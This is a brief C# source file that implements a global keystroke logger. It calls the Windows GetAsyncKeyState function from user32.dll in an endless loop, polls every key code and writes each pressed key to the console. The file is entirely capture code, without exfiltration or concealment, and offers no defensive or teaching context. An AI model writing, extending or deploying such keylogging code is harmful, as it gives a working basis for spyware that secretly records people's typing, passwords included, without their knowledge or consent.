using System.Runtime.InteropServices;

namespace anon_message_loop;

public class KeystateLogger: ILogger
{
    [DllImport("user32.dll")]
    private static extern int GetAsyncKeyState(Int32 i);

    private void LogKeyState(int startDelayMilliseconds)
    {
        while (true)
        {
            Thread.Sleep(startDelayMilliseconds);

            for (int i = 0; i < 255; i++)
            {
                int keyState = GetAsyncKeyState(i);
                // 32769 should be used for windows 10.
                if (keyState == 1 || keyState == -32767 || keyState == 32769)
                {
                    Console.WriteLine((char)i);
                    break;
                }
            }
        }
    }

    public void Log(int initDelayMilliseconds)
    {
        LogKeyState(initDelayMilliseconds);
    }
}